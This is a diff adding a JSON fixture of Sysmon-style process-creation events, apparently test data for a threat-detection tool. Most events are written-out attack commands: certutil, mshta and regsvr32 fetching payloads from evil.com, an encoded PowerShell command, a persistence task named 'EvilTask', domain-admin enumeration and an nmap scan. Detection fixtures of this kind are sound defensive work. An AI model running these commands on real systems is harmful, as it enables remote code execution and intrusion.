@@ -1,0 +1,125 @@
+[
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:00:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "explorer.exe",
+    "Hashes": "SHA1=60133F89A50BA5E0BCA7A1BB0B50CB7F2296062C",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:01:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\whoami.exe",
+    "CommandLine": "whoami /all",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "Hashes": "SHA1=33E56ED26CD40FEBF3388CA438CCEBEE61CEBEE0",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:02:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net group \"Domain Admins\" /domain",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:03:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks /create /tn \"EvilTask\" /tr \"cmd.exe /c echo pwned\" /sc ONSTART",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:04:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:05:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe http://evil.com/evil.hta",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:06:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+    "CommandLine": "wmic process call create \"powershell.exe -c calc.exe\"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:07:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\regsvr32.exe",
+    "CommandLine": "regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:08:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:09:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Users\\alice\\Downloads\\nmap.exe",
+    "CommandLine": "nmap -sS -p- 10.0.0.0/24",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "ParentCommandLine": "cmd.exe",
+    "category": "process"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-09-15T12:10:00.000Z",
+    "Computer": "HOST-WORKSTATION-01",
+    "User": "DOMAIN\\alice",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Temp\\notes.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ParentCommandLine": "explorer.exe",
+    "category": "process"
+  }
+]
